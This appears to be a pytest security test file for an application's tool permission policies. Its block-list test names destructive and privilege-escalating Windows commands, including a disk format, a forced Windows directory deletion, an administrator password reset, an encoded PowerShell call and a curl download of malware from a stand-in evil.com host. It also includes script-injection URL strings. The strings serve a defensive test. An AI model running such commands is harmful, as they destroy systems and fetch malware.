"""Security tests for Tool Permission Manager & Execution Boundaries."""

import pytest

from app.security.permissions import PermissionLevel, PermissionManager
from app.security.policies import is_command_blocked, is_path_blocked, is_url_allowed


def test_dangerous_commands_permanently_blocked():
    """Verify dangerous shell, registry, and privilege escalation commands are blocked."""
    banned_cmds = [
        "format C:",
        "reg add HKLM\\Software",
        "net user administrator Password123",
        "taskkill /f /im svchost.exe",
        "rmdir /s /q C:\\Windows",
        "powershell -encodedCommand abc",
        "curl http://evil.com/malware.exe -o run.exe",
    ]
    for cmd in banned_cmds:
        assert is_command_blocked(cmd) is True


def test_url_scheme_security():
    """Verify only http:// and https:// URLs are allowed."""
    assert is_url_allowed("https://google.com") is True
    assert is_url_allowed("http://localhost:8000") is True

    # Dangerous schemes
    assert is_url_allowed("file:///C:/Windows/System32/calc.exe") is False
    assert is_url_allowed("javascript:alert(1)") is False
    assert is_url_allowed("data:text/html,<script>alert(1)</script>") is False
    assert is_url_allowed("vbscript:MsgBox(1)") is False
